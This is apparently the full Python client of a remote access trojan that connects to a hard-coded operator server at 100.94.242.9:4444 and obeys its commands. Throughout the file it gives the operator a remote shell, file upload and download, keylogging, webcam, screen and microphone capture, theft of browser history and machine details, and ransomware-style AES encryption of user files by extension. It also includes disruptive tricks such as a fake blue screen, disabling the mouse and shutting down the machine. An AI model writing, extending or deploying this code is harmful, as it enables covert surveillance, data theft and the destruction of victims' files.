import socket
import subprocess
import platform
import struct
import pickle
import ctypes
import pyaudio
import wave
from pynput.keyboard import Key, Listener
import threading
from PIL import ImageGrab
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import getmac
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util import Counter
import pyttsx3
import cv2
import numpy as np
import pyautogui
import time
import sqlite3
import os
import shutil
import tkinter as tk
import random
import ssl
import requests
import logging

ServerHost = "100.94.242.9"
ServerPort = 4444
Buff = 1024


def CreateSocket():
    global client_socket
    try:
        plain_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Create an SSL context
        context = ssl.create_default_context()

        # Disable certificate verification (not recommended for production)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Wrap the plain socket with SSL
        client_socket = context.wrap_socket(plain_socket, server_hostname=ServerHost)
        print("Secure socket created successfully")
    except socket.error as msg:
        print("Socket creation error:", msg)


def ConnectToServer():
    global client_socket
    try:
        client_socket.connect((ServerHost, ServerPort))


    except socket.error as msg:
        print("Connection error:", msg)

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org')
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except Exception as e:
        print("Error fetching public IP:", e)
        return "Unknown"
def send_info():
    global client_socket
    try:
        desktop_name = platform.node()
        operating_system = platform.platform()
        mac_address = getmac.get_mac_address()
        ip_address = get_public_ip()
        user_name = os.getlogin()
        data = f"{desktop_name},{operating_system},{mac_address},{ip_address},{user_name}"

        client_socket.send(data.encode("utf-8"))
    except Exception as e:
        print("Error sending info:", e)




def send_file(filename):
    global client_socket
    try:
        if os.path.exists(filename):
            client_socket.send("yes".encode("utf-8"))
            file_size = os.path.getsize(filename)

            # Send file size using struct
            client_socket.send(struct.pack(">L", file_size))

            with open(filename, "rb") as file:
                while True:
                    data = file.read(Buff)
                    if not data:
                        break
                    client_socket.sendall(data)

        else:
            client_socket.send("no".encode("utf-8"))
    except Exception as e:
        print("Error sending file:", e)


def receive_file(filename):
    global client_socket
    size_bytes = client_socket.recv(4)
    file_size = struct.unpack(">L", size_bytes)[0]
    time.sleep(1)
    try:
        received_size = 0
        with open(filename, "wb") as file:
            while received_size < file_size:
                data = client_socket.recv(Buff)
                if not data:
                    break
                file.write(data)
                received_size += len(data)  # Update received_size

    except Exception as e:
        pass


def ReceiveCommands():
    global client_socket
    active_process = None
    while True:
        try:
            send_path()
            command = client_socket.recv(Buff).decode("utf-8")
            if command == "q":
                if active_process:
                    active_process.terminate()  # Terminate the active subprocess
                break
            execute_command(command)
        except Exception as e:
            print("Error receiving command:", e)


def send_path():
    global client_socket
    command = client_socket.recv(Buff).decode("utf-8")
    output = subprocess.getoutput(command)
    client_socket.send(output.encode("utf-8"))


def execute_command(command):
    global client_socket
    try:
        if command.startswith("cd "):
            directory = command[3:]
            os.chdir(directory)
            client_socket.send(f"Changed directory to {directory}".encode("utf-8"))
        else:
            # Execute other commands using subprocess
            output = subprocess.getoutput(command)
            if not output:
                output = "Command executed successfully, but no output produced."
            client_socket.send(output.encode("utf-8"))
    except Exception as e:
        print("Error executing command:", e)
        client_socket.send("Error executing command".encode("utf-8"))


def screenshot():
    try:
        filename = "screenshot.png"
        screenshot = ImageGrab.grab()  # Capture screenshot
        screenshot.save(filename)

        # Close the screenshot
        screenshot.close()

    except Exception as e:
        print("Error sending screenshot:", e)


def start_cam_stream(client_socket):
    cam = cv2.VideoCapture(0)
    cam.set(3, 320)
    cam.set(4, 240)

    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
    while True:
        ret, frame = cam.read()
        result, frame = cv2.imencode('.jpg', frame, encode_param)
        data = pickle.dumps(frame, 0)
        size = len(data)

        client_socket.sendall(struct.pack(">L", size) + data)
        client_socket.settimeout(0.01)
        try:
            msg = client_socket.recv(1024).decode('utf-8')
            if msg == 'stop':
                client_socket.settimeout(None)
                break
        except socket.timeout:

            pass

    cam.release()
    cv2.destroyAllWindows()


def start_screen_share(client_socket):
    while True:
        try:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            _, frame_encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
            size = len(frame_encoded)
            client_socket.sendall(struct.pack(">L", size))
            client_socket.sendall(frame_encoded)

        except Exception as e:
            print("Error:", e)
            break

    client_socket.close()


record_audio = False
frames = []


def record_audio_function():
    global record_audio
    global frames

    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

    while record_audio:
        data = stream.read(1024)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Save recorded audio to a file
    filename = "audio.wav"
    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print("Error:", e)
        return None


def show_message_box(text, title):
    #user32 = ctypes.WinDLL('user32')
    #user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
    ctypes.windll.user32.MessageBoxW(0,text,title, 0x00000000 | 0x00000040)


running = False
listener_thread = None


def on_press(key):
    global running
    key_to_log = str(key)
    if key == Key.enter:
        key_to_log = "\n"
    elif key == Key.tab:
        key_to_log = "\t"
    logging.info(key_to_log)

    if not running:
        return False


def start_keylogger():
    global running, listener_thread
    running = True
    listener_thread = threading.Thread(target=run_listener)
    listener_thread.start()


def run_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()


def set_volume(volume_level):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(volume_level, None)


def disable_mouse():
    width, height = pyautogui.size()
    pyautogui.moveTo(width // 2, height // 2)  # Move the mouse to the center of the screen
    pyautogui.FAILSAFE = False  # Disable the failsafe to prevent accidental termination of the script
    pyautogui.mouseDown(button='left')  # Press the left mouse button
    pyautogui.mouseDown(button='right')  # Press the right mouse button


def enable_mouse():
    pyautogui.mouseUp(button='left')  # Release the left mouse button
    pyautogui.mouseUp(button='right')  # Release the right mouse button
    pyautogui.FAILSAFE = True  # Re-enable the failsafe


def encryption(key, file_name):
    counter = Counter.new(128)
    c = AES.new(key, AES.MODE_CTR, counter=counter)

    if os.path.exists(file_name):
        with open(file_name, 'rb') as f:
            plaintext = f.read()

        with open(file_name, 'wb') as fi:
            fi.write(c.encrypt(plaintext))

        return [key]


def decryption(key, file_name):
    counter = Counter.new(128)
    c = AES.new(key, AES.MODE_CTR, counter=counter)

    if os.path.exists(file_name):
        with open(file_name, 'rb') as f:
            ciphertext = f.read()

        decrypted_data = c.decrypt(ciphertext)

        with open(file_name, 'wb') as fi:
            fi.write(decrypted_data)

        return decrypted_data


def dir_f_list(d):
    extensions = [
        'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images
        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
        'java', 'class', 'jar',  # java source code
        'ps', 'bat', 'vb',  # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies
        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak', 'bin'
    ]
    fd = []
    for d, sd, f in os.walk(d):
        for file_name in f:
            full_path = os.path.join(d, file_name)
            ex = full_path.split(".")[-1]
            if ex in extensions:
                fd.append(full_path)
                # print(full_path)
    return fd


def set_language(language_code):
    command = f'powershell.exe Set-WinUserLanguageList -LanguageList "{language_code}" -Force'
    try:
        subprocess.run(command, check=True, shell=True)
    except subprocess.CalledProcessError as e:
        pass


def text_to_speech(text):
    engine = pyttsx3.init()
    engine.setProperty('rate', 150)  # Speed of speech
    engine.setProperty('volume', 0.9)  # Volume (0.0 to 1.0)
    engine.say(text)
    engine.runAndWait()


screen_record = False


def record_screen():
    global screen_record
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 20.0, (screen_width, screen_height))

    while screen_record:
        frame = pyautogui.screenshot()
        frame = np.array(frame)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)

    out.release()
    cv2.destroyAllWindows()


loop = False


def send_services():
    powershell_command = 'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"'
    result = subprocess.run(powershell_command, shell=True, capture_output=True, text=True)
    output = result.stdout
    client_socket.send(output.encode("utf-8"))


def service_inloop(service):
    global loop
    while loop:
        powershell_command = f'Start-Process {service}'
        subprocess.run(["powershell", "-Command", powershell_command])


def fetch_history(browser):
    username = os.getenv('USERNAME')
    current_directory = os.getcwd()
    if browser == 'chrome':
        path_org = os.path.join("C:\\Users", username, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    elif browser == 'edge':
        path_org = os.path.join("C:\\Users", username, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
    elif browser == 'opera':
        path_org = os.path.join("C:\\Users", username, "AppData\\Roaming\\Opera Software\\Opera Stable\\History")
    path_new = os.path.join(current_directory, "History")
    shutil.copyfile(path_org, path_new)
    con = sqlite3.connect(path_new)
    cursor = con.cursor()
    query = "SELECT url FROM urls"
    cursor.execute(query)
    urls = cursor.fetchall()
    history_file_path = os.path.join(current_directory, f"{browser}_history.txt")
    with open(history_file_path, 'w') as f:
        for url in urls:
            f.write("".join(url) + "\n")
    con.close()
    os.remove(path_new)


def set_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    SPI_SETDESKWALLPAPER = 20
    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_path, 3)


def fake_bsod(close_time):
    def change_background(window, color_index):
        colors = ["blue", "black"]  # List of colors to alternate between
        color = colors[color_index % len(colors)]  # Get the color based on the index
        window.configure(bg=color)  # Set the background color
        next_color_index = (color_index + 1) % len(colors)  # Increment the color index
        window.after(500, change_background, window, next_color_index)  # Schedule next color change after 0.5 seconds

    def close_window(window):
        window.destroy()  # Close the window

    window = tk.Tk()
    window.attributes("-fullscreen", True)  # Set fullscreen
    window.configure(bg="blue")  # Set initial background color
    window.after(close_time * 1000, lambda: close_window(window))  # Schedule window to close after specified time
    change_background(window, 0)  # Start color-changing process with blue as the initial color
    window.mainloop()


audio_record = False


def send_audio_stream(client_socket):
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=2,
                    rate=44100,
                    input=True,
                    frames_per_buffer=1024)

    try:
        while audio_record:
            data = stream.read(1024)
            client_socket.sendall(data)
    except Exception as e:
        pass


def main():
    global client_socket
    global logging
    global webcam_streaming
    global record_audio
    global audio_record
    global frames
    global path
    global key
    global dir
    global screen_record
    global loop
    global share
    enable = True
    CreateSocket()
    ConnectToServer()
    while True:
        command = client_socket.recv(1024).decode("utf-8")
        if command == "list":
            send_info()
        elif command == "download":
            while True:
                filename = client_socket.recv(1024).decode("utf-8")
                if filename == "back":
                    break
                send_file(filename)
        elif command == "upload":
            msg = client_socket.recv(1024).decode("utf-8")
            if msg == "yes":
                filename = client_socket.recv(1024).decode("utf-8")
                receive_file(filename)
            else:
                pass


        elif command == "cmd":
            ReceiveCommands()
        elif command == "webcam":
            webcam_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            webcam_socket.connect((ServerHost, 9898))
            start_cam_stream(webcam_socket)
            webcam_socket.close()
        elif command == "screenshare":
            screen_share_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            screen_share_socket.connect((ServerHost, 9999))
            start_screen_share(screen_share_socket)

        elif command.startswith("voice_record") and command.endswith("--start"):
            record_audio = True
            frames = []  # Clear previous audio frames
            audio_thread = threading.Thread(target=record_audio_function)
            audio_thread.start()
        elif command.startswith("voice_record") and command.endswith("--stop"):
            record_audio = False
            audio_thread.join()
            send_file("audio.wav")
            os.remove("audio.wav")
        elif command == "screenshot":
            screenshot()
            send_file("screenshot.png")
            os.remove("screenshot.png")
        elif command == "lock_screen":
            ctypes.windll.user32.LockWorkStation()
        elif command == "shutdown":
            os.system("shutdown /s /t 1")
        elif command == "portscanner":
            pass

        elif command == "send_message":
            text = client_socket.recv(Buff).decode()
            title = client_socket.recv(Buff).decode()
            message_box_thread = threading.Thread(target=show_message_box, args=(text, title))
            message_box_thread.start()
            client_socket.send('MessageBox has appeared'.encode())
        elif command.startswith("keylogger") and command.endswith("--start"):
            logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(message)s")
            start_keylogger()
        elif command.startswith("keylogger") and command.endswith("--stop"):
            global running
            running = False
            logging.shutdown()
            send_file('keylog.txt')
            os.remove('keylog.txt')
        elif command.startswith("volume") and command.endswith("-u"):
            set_volume(1.0)
        elif command.startswith("volume") and command.endswith("-d"):
            set_volume(0.0)
        elif command.startswith("disable") and command.endswith("--mouse"):
            disable_mouse()
        elif command.startswith("enable") and command.endswith("--mouse"):
            enable_mouse()
        elif command.startswith("keyboard"):
            language = client_socket.recv(1024).decode("utf-8")
            if language in ["ru-RU", "ar-SA", "fr-FR", "en-US"]:
                set_language(language)
            else:
                pass

        elif command == "encrypt":
            while True:
                path = client_socket.recv(1024).decode("utf-8")
                if path == "back":
                    break
                if os.path.exists(path):
                    client_socket.send("exist".encode("utf-8"))
                    key = get_random_bytes(16)
                    client_socket.send(key)
                    if os.path.isdir(path):
                        dir = dir_f_list(path)
                        for f in dir:
                            encryption(key, f)
                        break
                    else:
                        encryption(key, path)
                        break
                else:
                    client_socket.send("does not exist".encode("utf-8"))

        elif command == "decrypt":
            if os.path.isdir(path):
                dir = dir_f_list(path)
                for f in dir:
                    decryption(key, f)
            else:
                decryption(key, path)

        elif command == "taskkill":
            try:
                pid = int(client_socket.recv(1024).decode("utf-8"))
                command = f'taskkill /PID {pid}'
                execute_command(command)
            except Exception as e:
                client_socket.send("Invalid PID entered. Please enter a valid integer PID.".encode("utf-8"))
        elif command == "speech":
            text = client_socket.recv(1024).decode("utf-8")
            text_to_speech(text)
        elif command.startswith("screen_record") and command.endswith("--start"):
            screen_record = True
            screen_thread = threading.Thread(target=record_screen)
            screen_thread.start()
        elif command.startswith("screen_record") and command.endswith("--stop"):
            screen_record = False
            screen_thread.join()
            send_file("output.mp4")
            os.remove("output.mp4")
        elif command.startswith("inloop") and command.endswith("--start"):
            loop = True
            send_services()
            service = client_socket.recv(1024).decode("utf-8")
            loop_thread = threading.Thread(target=service_inloop, args=(service,))
            loop_thread.start()
        elif command.startswith("inloop") and command.endswith("--stop"):
            loop = False
            loop_thread.join()
        elif command == "browser_history":
            browser = client_socket.recv(1024).decode("utf-8")
            if browser in ['chrome', 'edge', 'opera']:
                fetch_history(browser)
                filename = browser + "_history.txt"
                send_file(filename)
                os.remove(filename)
            else:
                pass
        elif command == "wallpaper":
            receive_file("wallpaper.png")
            set_wallpaper("wallpaper.png")
            os.remove("wallpaper.png")
        elif command == "!BSod":
            time = int(client_socket.recv(1024).decode("utf-8"))
            fake_bsod(time)
        elif command == "bruteforce":
            pass
        elif command == "audiostart":
            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            audio_socket.connect((ServerHost, 3131))
            audio_record = True
            audio_stream_thread = threading.Thread(target=send_audio_stream, args=(audio_socket,))
            audio_stream_thread.start()
        elif command == "audiostop":
            audio_record = False
            audio_stream_thread.join()
            audio_socket.close()
        elif command == "exit":
            client_socket.close()
            break

        else:
            pass


if __name__ == "__main__":
    main()
